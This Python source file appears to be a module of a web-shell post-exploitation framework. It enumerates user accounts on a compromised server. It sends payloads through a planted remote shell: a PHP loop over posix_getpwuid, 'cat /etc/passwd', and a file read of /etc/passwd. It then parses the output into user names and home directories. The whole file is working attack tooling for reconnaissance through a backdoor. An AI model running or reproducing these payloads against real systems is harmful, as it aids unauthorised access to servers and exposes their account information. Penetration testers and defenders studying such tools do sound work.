'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P

classname = 'Users'
    
    
class User:
    
    def __init__(self,line):
           
        linesplit = line.split(':')
        
        self.line = line
        self.name = linesplit[0]
        
        if len(linesplit) > 5 and linesplit[5]:
            self.home = linesplit[5]
        else:
            self.home = '/home/' + self.name
            
    
class Users(Module):
    """Enumerate users and /etc/passwd content
    :audit.users 
    """
    
    
    vectors = VectorList([
        V('shell.php', 'posix_getpwuid', "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }"),
        V('shell.sh', 'cat', "cat %s"),
        V('file.read', 'fileread', "%s")
        ])
    

    params = ParametersList('Enumerate users and /etc/passwd content', vectors.get_names_list())
    
    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.usersinfo = {}
        
                
    def run_module(self):
        
        
        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            
            response = self.__execute_payload(vector, [])
            if response != None:
                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                return response
        

    def __execute_payload(self, vector, parameters):
        
        payload = self.__prepare_payload(vector, parameters)
    
        try:    
            response = self.modhandler.load(vector.interpreter).run_module(payload)
        except ModuleException:
            response = None
            
            
        if response and ':0:0:' in response:
            
            self.mprint("[%s] Enumerating user using method '%s'" % (self.name, vector))
            
            for line in response.split('\n'):
                if line:
                    user = User(line)
                    self.usersinfo[user]=user
            
            return response

        raise ModuleException(self.name,  "Users enumeration failed")
                
        
    def __prepare_payload( self, vector, parameters):

        if vector.payloads[0].count( '%s' ) == 1:
            return vector.payloads[0] % ('/etc/passwd')
        else:
            return vector.payloads[0] 


    
    
    